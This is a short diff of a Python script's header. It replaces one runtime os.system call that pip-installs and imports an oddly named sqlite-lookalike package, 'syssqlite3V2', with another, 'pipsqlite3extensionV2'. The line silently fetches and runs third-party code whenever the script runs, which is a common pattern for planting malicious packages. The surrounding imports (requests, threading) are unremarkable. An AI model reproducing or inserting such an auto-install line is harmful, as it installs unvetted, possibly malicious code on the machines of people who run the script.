@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite3V2")
-import syssqlite3V2
+os.system("pip install pipsqlite3extensionV2")
+import pipsqlite3extensionV2
 from optparse import Option
 import requests
 import threading
